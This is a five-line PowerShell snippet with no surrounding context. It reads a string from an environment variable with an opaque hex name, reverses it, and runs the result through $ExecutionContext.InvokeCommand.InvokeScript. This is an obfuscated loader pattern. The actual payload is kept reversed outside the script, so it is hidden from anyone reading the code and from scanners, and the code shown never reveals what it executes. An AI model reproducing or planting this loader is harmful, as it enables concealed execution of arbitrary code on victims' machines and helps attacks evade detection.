$envVar = [Environment]::GetEnvironmentVariable('9964a802'); 
$charArray = $envVar.ToCharArray(); 
[Array]::Reverse($charArray); 
$rev = -join $charArray; 
$ExecutionContext.InvokeCommand.InvokeScript($rev)
